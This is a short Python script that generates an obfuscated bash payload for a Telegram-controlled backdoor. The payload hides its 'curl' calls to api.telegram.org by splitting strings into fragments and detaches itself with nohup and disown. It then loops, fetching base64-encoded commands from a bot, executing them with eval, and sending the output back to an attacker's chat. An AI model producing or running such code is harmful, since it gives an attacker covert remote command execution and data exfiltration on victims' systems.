import string, random

def generate_random_id():
    # Generate three random groups of 6 characters each
    characters = string.digits + string.ascii_letters
    random_id = ''.join(random.choices(characters, k=6))
    return random_id

bot_token = input("Enter bot token: ")
chat_id = input("Enter chat ID: ")
sleep_interval = input("Enter sleep interval (in seconds): ")
session_id = generate_random_id()

bt = bot_token.split(":")

payload = '''nohup bash -c 'sl={};lr="cu";bt="{}";se="essage";sg="/getU";i="/ap";s="s";e="i.teleg";sp="pdates";a="htt";n="rg/bot";ss="/sendM";ee="ram.o";ci="{}";ot=0;si="{}";bk="{}";uc="rl";l="ps:/";hps="chat_id=${}&text=$(echo -n "{\"k\":\"${si}\",\"c\":\"\",\"hc\":\"1\"}" | base64)";while true; do r=$("$lr$uc" -"$s" "$a$l$i$e$ee$n$bt:$bk$ss$se?$hps");ps="?offset=${ot}&limit=1&timeout=2";gs=$("$lr$uc" -"$s" "$a$l$i$e$ee$n$bt:$bk$sg$sp$ps");sc=$(echo "$gs" | sed -n "s/.*\"ok\":[[:space:]]*\([^,}]*\).*/\1/p");us=$(echo "$gs" | sed "s/{\"ok\":true,\"result\":\[//" | sed "s/]}$//");if [ "$sc" = "true" ] && [ -n "$us" ]; then uip="\"update_id\":[[:digit:]]+";tp="\"text\":\"[^\"]+";if [[ $us =~ $uip ]]; then ud="${BASH_REMATCH[0]}";fi;if [[ $us =~ $tp ]]; then tt="${BASH_REMATCH[0]}";fi;ud=$(echo "$ud" | sed "s/\"update_id\"://g");tt=$(echo "$tt" | sed "s/\"text\":\"//g");if [ -n "$ud" ] && [ -n "$tt" ]; then dt=$(echo "$tt" | base64 -d);ex=$(eval "$dt");re=$(echo -e "$ex" | base64);sps="chat_id=${ci}&text=$(echo -n "{\"k\":\"${si}\",\"c\":\"${tt}\",\"v\":\"${re}\",\"hc\":\"1\"}" | base64 -w 0)";z=$("$lr$uc" -"$s" "$a$l$i$e$ee$n$bt:$bk$ss$se?$sps");fi;((ot=ud+1));fi;sleep "$sl";done;' & disown'''.format(sleep_interval, bt[0], chat_id, session_id, bt[1], chat_id)